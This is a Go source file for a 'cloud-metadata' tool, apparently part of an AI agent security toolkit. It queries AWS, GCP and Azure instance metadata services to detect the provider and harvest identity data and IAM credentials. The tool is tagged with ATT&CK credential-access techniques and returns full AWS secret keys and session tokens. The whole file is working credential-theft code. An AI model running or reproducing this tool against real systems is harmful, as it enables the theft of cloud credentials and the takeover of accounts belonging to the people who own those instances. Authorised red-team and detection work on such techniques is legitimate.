package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	sdkinput "github.com/zero-day-ai/sdk/input"
	"github.com/zero-day-ai/sdk/toolerr"
	"github.com/zero-day-ai/sdk/tool"
	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "cloud-metadata"
	ToolVersion     = "1.0.0"
	ToolDescription = "Cloud metadata service access for credential extraction and cloud provider detection"
	DefaultMetadataIP = "169.254.169.254"
)

// Cloud provider metadata endpoints
var (
	awsMetadataBase   = "http://%s/latest/meta-data/"
	awsCredentialsBase = "http://%s/latest/meta-data/iam/security-credentials/"
	awsIdentityDoc    = "http://%s/latest/dynamic/instance-identity/document"
	awsTokenEndpoint  = "http://%s/latest/api/token"

	gcpMetadataBase   = "http://%s/computeMetadata/v1/"
	gcpIdentity       = "http://%s/computeMetadata/v1/instance/"
	gcpServiceAccount = "http://%s/computeMetadata/v1/instance/service-accounts/default/"

	azureMetadataBase = "http://%s/metadata/instance"
	azureIdentity     = "http://%s/metadata/identity/oauth2/token"
)

// ToolImpl implements the cloud-metadata tool
type ToolImpl struct {
	client *http.Client
}

// NewTool creates a new cloud-metadata tool instance
func NewTool() tool.Tool {
	cfg := tool.NewConfig().
		SetName(ToolName).
		SetVersion(ToolVersion).
		SetDescription(ToolDescription).
		SetTags([]string{
			"kubernetes",
			"cloud",
			"credential-access",
			"reconnaissance",
			"T1552.005", // Unsecured Credentials: Cloud Instance Metadata API
			"T1078.004", // Valid Accounts: Cloud Accounts
			"T1580",     // Cloud Infrastructure Discovery
		}).
		SetInputSchema(InputSchema()).
		SetOutputSchema(OutputSchema()).
		SetExecuteFunc((&ToolImpl{}).Execute)

	t, _ := tool.New(cfg)
	return &toolWithHealth{Tool: t, impl: &ToolImpl{}}
}

// toolWithHealth wraps the tool to add custom health checks
type toolWithHealth struct {
	tool.Tool
	impl *ToolImpl
}

func (t *toolWithHealth) Health(ctx context.Context) types.HealthStatus {
	return t.impl.Health(ctx)
}

// Execute implements the cloud metadata access logic
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	start := time.Now()
	warnings := []string{}

	action := sdkinput.GetString(input, "action")
	if action == "" {
		return nil, fmt.Errorf("action is required")
	}

	timeout := 10 * time.Second
	if to := sdkinput.GetInt(input, "timeout"); to > 0 {
		timeout = time.Duration(to) * time.Second
	}

	t.client = &http.Client{Timeout: timeout}

	metadataIP := sdkinput.GetString(input, "metadata_ip")
	if metadataIP == "" {
		metadataIP = DefaultMetadataIP
	}

	provider := sdkinput.GetString(input, "provider")

	var result map[string]any
	var err error

	switch action {
	case "detect":
		result, err = t.detectProvider(ctx, metadataIP)
	case "get-credentials":
		result, err = t.getCredentials(ctx, input, metadataIP, provider)
	case "get-identity":
		result, err = t.getIdentity(ctx, input, metadataIP, provider)
	case "get-all":
		result, err = t.getAll(ctx, input, metadataIP, provider)
	case "custom":
		result, err = t.customQuery(ctx, input, metadataIP)
	default:
		return nil, fmt.Errorf("unknown action: %s", action)
	}

	if err != nil {
		return map[string]any{
			"success":             false,
			"metadata_accessible": false,
			"error":               err.Error(),
			"warnings":            warnings,
			"execution_time_ms":   time.Since(start).Milliseconds(),
		}, nil
	}

	result["success"] = true
	result["metadata_accessible"] = true
	result["warnings"] = warnings
	result["execution_time_ms"] = time.Since(start).Milliseconds()
	return result, nil
}

// detectProvider auto-detects the cloud provider
func (t *ToolImpl) detectProvider(ctx context.Context, metadataIP string) (map[string]any, error) {
	// Try AWS first (most common)
	if t.checkAWS(ctx, metadataIP) {
		return map[string]any{
			"provider":         "aws",
			"provider_version": "IMDS",
		}, nil
	}

	// Try GCP
	if t.checkGCP(ctx, metadataIP) {
		return map[string]any{
			"provider":         "gcp",
			"provider_version": "Compute Metadata",
		}, nil
	}

	// Try Azure
	if t.checkAzure(ctx, metadataIP) {
		return map[string]any{
			"provider":         "azure",
			"provider_version": "IMDS",
		}, nil
	}

	return nil, fmt.Errorf("could not detect cloud provider - metadata service not accessible")
}

func (t *ToolImpl) checkAWS(ctx context.Context, metadataIP string) bool {
	url := fmt.Sprintf(awsMetadataBase, metadataIP)
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	resp, err := t.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (t *ToolImpl) checkGCP(ctx context.Context, metadataIP string) bool {
	url := fmt.Sprintf(gcpMetadataBase, metadataIP)
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := t.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (t *ToolImpl) checkAzure(ctx context.Context, metadataIP string) bool {
	url := fmt.Sprintf(azureMetadataBase, metadataIP) + "?api-version=2021-02-01"
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata", "true")
	resp, err := t.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// getCredentials retrieves cloud credentials from metadata
func (t *ToolImpl) getCredentials(ctx context.Context, input map[string]any, metadataIP, provider string) (map[string]any, error) {
	// Auto-detect provider if not specified
	if provider == "" || provider == "auto" {
		detected, err := t.detectProvider(ctx, metadataIP)
		if err != nil {
			return nil, err
		}
		provider = detected["provider"].(string)
	}

	switch provider {
	case "aws":
		return t.getAWSCredentials(ctx, input, metadataIP)
	case "gcp":
		return t.getGCPCredentials(ctx, metadataIP)
	case "azure":
		return t.getAzureCredentials(ctx, metadataIP)
	default:
		return nil, fmt.Errorf("unsupported provider: %s", provider)
	}
}

func (t *ToolImpl) getAWSCredentials(ctx context.Context, input map[string]any, metadataIP string) (map[string]any, error) {
	imdsVersion := sdkinput.GetInt(input, "imds_version")
	if imdsVersion == 0 {
		imdsVersion = 2
	}

	var token string
	imdsUsed := imdsVersion

	// Try IMDSv2 first
	if imdsVersion == 2 {
		tokenURL := fmt.Sprintf(awsTokenEndpoint, metadataIP)
		req, _ := http.NewRequestWithContext(ctx, "PUT", tokenURL, nil)
		req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
		resp, err := t.client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			token = string(body)
		} else {
			// Fall back to IMDSv1
			imdsUsed = 1
		}
	}

	// Get role name
	roleURL := fmt.Sprintf(awsCredentialsBase, metadataIP)
	req, _ := http.NewRequestWithContext(ctx, "GET", roleURL, nil)
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get IAM role: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return map[string]any{
			"provider":          "aws",
			"credentials_found": false,
			"imds_version_used": imdsUsed,
		}, nil
	}

	body, _ := io.ReadAll(resp.Body)
	roleName := strings.TrimSpace(string(body))

	// Get credentials for the role
	credURL := fmt.Sprintf(awsCredentialsBase, metadataIP) + roleName
	req, _ = http.NewRequestWithContext(ctx, "GET", credURL, nil)
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}
	resp, err = t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get credentials: %w", err)
	}
	defer resp.Body.Close()

	body, _ = io.ReadAll(resp.Body)
	var creds struct {
		AccessKeyId     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
		Expiration      string `json:"Expiration"`
	}
	if err := json.Unmarshal(body, &creds); err != nil {
		return nil, fmt.Errorf("failed to parse credentials: %w", err)
	}

	return map[string]any{
		"provider":          "aws",
		"credentials_found": true,
		"imds_version_used": imdsUsed,
		"identity": map[string]any{
			"role_name": roleName,
		},
		"credentials": map[string]any{
			"access_key_id":     creds.AccessKeyId,
			"secret_access_key": creds.SecretAccessKey,
			"session_token":     creds.Token,
			"expiration":        creds.Expiration,
		},
	}, nil
}

func (t *ToolImpl) getGCPCredentials(ctx context.Context, metadataIP string) (map[string]any, error) {
	url := fmt.Sprintf(gcpServiceAccount, metadataIP) + "token"
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get GCP token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return map[string]any{
			"provider":          "gcp",
			"credentials_found": false,
		}, nil
	}

	body, _ := io.ReadAll(resp.Body)
	var token struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
		TokenType   string `json:"token_type"`
	}
	if err := json.Unmarshal(body, &token); err != nil {
		return nil, fmt.Errorf("failed to parse GCP token: %w", err)
	}

	// Get service account email
	emailURL := fmt.Sprintf(gcpServiceAccount, metadataIP) + "email"
	req, _ = http.NewRequestWithContext(ctx, "GET", emailURL, nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err = t.client.Do(req)
	email := ""
	if err == nil && resp.StatusCode == 200 {
		emailBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		email = string(emailBody)
	}

	return map[string]any{
		"provider":          "gcp",
		"credentials_found": true,
		"identity": map[string]any{
			"role_name": email,
		},
		"credentials": map[string]any{
			"access_key_id": token.AccessToken[:20] + "...", // Truncate for safety
			"token_type":    token.TokenType,
			"expiration":    fmt.Sprintf("%d seconds", token.ExpiresIn),
		},
	}, nil
}

func (t *ToolImpl) getAzureCredentials(ctx context.Context, metadataIP string) (map[string]any, error) {
	url := fmt.Sprintf(azureIdentity, metadataIP) + "?api-version=2018-02-01&resource=https://management.azure.com/"
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata", "true")
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get Azure token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return map[string]any{
			"provider":          "azure",
			"credentials_found": false,
		}, nil
	}

	body, _ := io.ReadAll(resp.Body)
	var token struct {
		AccessToken  string `json:"access_token"`
		ExpiresOn    string `json:"expires_on"`
		Resource     string `json:"resource"`
		TokenType    string `json:"token_type"`
		ClientId     string `json:"client_id"`
	}
	if err := json.Unmarshal(body, &token); err != nil {
		return nil, fmt.Errorf("failed to parse Azure token: %w", err)
	}

	return map[string]any{
		"provider":          "azure",
		"credentials_found": true,
		"identity": map[string]any{
			"role_name": token.ClientId,
		},
		"credentials": map[string]any{
			"access_key_id": token.AccessToken[:20] + "...", // Truncate for safety
			"token_type":    token.TokenType,
			"expiration":    token.ExpiresOn,
		},
	}, nil
}

// getIdentity retrieves cloud identity information
func (t *ToolImpl) getIdentity(ctx context.Context, input map[string]any, metadataIP, provider string) (map[string]any, error) {
	// Auto-detect provider if not specified
	if provider == "" || provider == "auto" {
		detected, err := t.detectProvider(ctx, metadataIP)
		if err != nil {
			return nil, err
		}
		provider = detected["provider"].(string)
	}

	switch provider {
	case "aws":
		return t.getAWSIdentity(ctx, input, metadataIP)
	case "gcp":
		return t.getGCPIdentity(ctx, metadataIP)
	case "azure":
		return t.getAzureIdentity(ctx, metadataIP)
	default:
		return nil, fmt.Errorf("unsupported provider: %s", provider)
	}
}

func (t *ToolImpl) getAWSIdentity(ctx context.Context, input map[string]any, metadataIP string) (map[string]any, error) {
	imdsVersion := sdkinput.GetInt(input, "imds_version")
	if imdsVersion == 0 {
		imdsVersion = 2
	}

	var token string
	imdsUsed := imdsVersion

	// Try IMDSv2 first
	if imdsVersion == 2 {
		tokenURL := fmt.Sprintf(awsTokenEndpoint, metadataIP)
		req, _ := http.NewRequestWithContext(ctx, "PUT", tokenURL, nil)
		req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
		resp, err := t.client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			token = string(body)
		} else {
			imdsUsed = 1
		}
	}

	// Get instance identity document
	url := fmt.Sprintf(awsIdentityDoc, metadataIP)
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get identity document: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var identity struct {
		AccountId        string `json:"accountId"`
		InstanceId       string `json:"instanceId"`
		Region           string `json:"region"`
		AvailabilityZone string `json:"availabilityZone"`
		InstanceType     string `json:"instanceType"`
		PrivateIp        string `json:"privateIp"`
	}
	if err := json.Unmarshal(body, &identity); err != nil {
		return nil, fmt.Errorf("failed to parse identity: %w", err)
	}

	return map[string]any{
		"provider":          "aws",
		"imds_version_used": imdsUsed,
		"identity": map[string]any{
			"account_id":        identity.AccountId,
			"instance_id":       identity.InstanceId,
			"region":            identity.Region,
			"availability_zone": identity.AvailabilityZone,
			"instance_type":     identity.InstanceType,
		},
		"network_info": map[string]any{
			"local_ipv4": identity.PrivateIp,
		},
	}, nil
}

func (t *ToolImpl) getGCPIdentity(ctx context.Context, metadataIP string) (map[string]any, error) {
	identity := map[string]any{}

	// Get project ID
	projectURL := fmt.Sprintf(gcpMetadataBase, metadataIP) + "project/project-id"
	if data, err := t.gcpGet(ctx, projectURL); err == nil {
		identity["account_id"] = string(data)
	}

	// Get instance ID
	instanceURL := fmt.Sprintf(gcpIdentity, metadataIP) + "id"
	if data, err := t.gcpGet(ctx, instanceURL); err == nil {
		identity["instance_id"] = string(data)
	}

	// Get zone
	zoneURL := fmt.Sprintf(gcpIdentity, metadataIP) + "zone"
	if data, err := t.gcpGet(ctx, zoneURL); err == nil {
		zone := string(data)
		identity["availability_zone"] = zone
		// Extract region from zone (e.g., projects/123/zones/us-central1-a -> us-central1)
		parts := strings.Split(zone, "/")
		if len(parts) > 0 {
			zoneName := parts[len(parts)-1]
			if idx := strings.LastIndex(zoneName, "-"); idx > 0 {
				identity["region"] = zoneName[:idx]
			}
		}
	}

	// Get machine type
	machineURL := fmt.Sprintf(gcpIdentity, metadataIP) + "machine-type"
	if data, err := t.gcpGet(ctx, machineURL); err == nil {
		identity["instance_type"] = string(data)
	}

	return map[string]any{
		"provider": "gcp",
		"identity": identity,
	}, nil
}

func (t *ToolImpl) gcpGet(ctx context.Context, url string) ([]byte, error) {
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func (t *ToolImpl) getAzureIdentity(ctx context.Context, metadataIP string) (map[string]any, error) {
	url := fmt.Sprintf(azureMetadataBase, metadataIP) + "?api-version=2021-02-01"
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Metadata", "true")
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get Azure identity: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var instance struct {
		Compute struct {
			SubscriptionId string `json:"subscriptionId"`
			VmId           string `json:"vmId"`
			Location       string `json:"location"`
			VmSize         string `json:"vmSize"`
			Zone           string `json:"zone"`
		} `json:"compute"`
		Network struct {
			Interface []struct {
				Ipv4 struct {
					IpAddress []struct {
						PrivateIpAddress string `json:"privateIpAddress"`
						PublicIpAddress  string `json:"publicIpAddress"`
					} `json:"ipAddress"`
				} `json:"ipv4"`
			} `json:"interface"`
		} `json:"network"`
	}
	if err := json.Unmarshal(body, &instance); err != nil {
		return nil, fmt.Errorf("failed to parse Azure identity: %w", err)
	}

	networkInfo := map[string]any{}
	if len(instance.Network.Interface) > 0 && len(instance.Network.Interface[0].Ipv4.IpAddress) > 0 {
		networkInfo["local_ipv4"] = instance.Network.Interface[0].Ipv4.IpAddress[0].PrivateIpAddress
		networkInfo["public_ipv4"] = instance.Network.Interface[0].Ipv4.IpAddress[0].PublicIpAddress
	}

	return map[string]any{
		"provider": "azure",
		"identity": map[string]any{
			"account_id":        instance.Compute.SubscriptionId,
			"instance_id":       instance.Compute.VmId,
			"region":            instance.Compute.Location,
			"availability_zone": instance.Compute.Zone,
			"instance_type":     instance.Compute.VmSize,
		},
		"network_info": networkInfo,
	}, nil
}

// getAll retrieves all available metadata
func (t *ToolImpl) getAll(ctx context.Context, input map[string]any, metadataIP, provider string) (map[string]any, error) {
	// Auto-detect provider if not specified
	if provider == "" || provider == "auto" {
		detected, err := t.detectProvider(ctx, metadataIP)
		if err != nil {
			return nil, err
		}
		provider = detected["provider"].(string)
	}

	identityResult, _ := t.getIdentity(ctx, input, metadataIP, provider)
	credResult, _ := t.getCredentials(ctx, input, metadataIP, provider)

	result := map[string]any{
		"provider": provider,
	}

	if identityResult != nil {
		if id, ok := identityResult["identity"]; ok {
			result["identity"] = id
		}
		if net, ok := identityResult["network_info"]; ok {
			result["network_info"] = net
		}
		if imds, ok := identityResult["imds_version_used"]; ok {
			result["imds_version_used"] = imds
		}
	}

	if credResult != nil {
		if creds, ok := credResult["credentials"]; ok {
			result["credentials"] = creds
		}
		if found, ok := credResult["credentials_found"]; ok {
			result["credentials_found"] = found
		}
	}

	return result, nil
}

// customQuery performs a custom metadata query
func (t *ToolImpl) customQuery(ctx context.Context, input map[string]any, metadataIP string) (map[string]any, error) {
	path := sdkinput.GetString(input, "path")
	if path == "" {
		return nil, fmt.Errorf("path is required for custom queries")
	}

	url := fmt.Sprintf("http://%s%s", metadataIP, path)
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)

	// Add provider-specific headers
	provider := sdkinput.GetString(input, "provider")
	if provider == "gcp" {
		req.Header.Set("Metadata-Flavor", "Google")
	} else if provider == "azure" {
		req.Header.Set("Metadata", "true")
	}

	// Add custom headers
	if headers, ok := input["headers"].(map[string]any); ok {
		for k, v := range headers {
			if s, ok := v.(string); ok {
				req.Header.Set(k, s)
			}
		}
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	return map[string]any{
		"raw_response": string(body),
		"status_code":  resp.StatusCode,
	}, nil
}

// Health checks if we can potentially reach metadata services
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	// This tool doesn't require any external binaries
	// It uses native Go HTTP client
	return types.NewHealthyStatus("cloud-metadata tool is available")
}
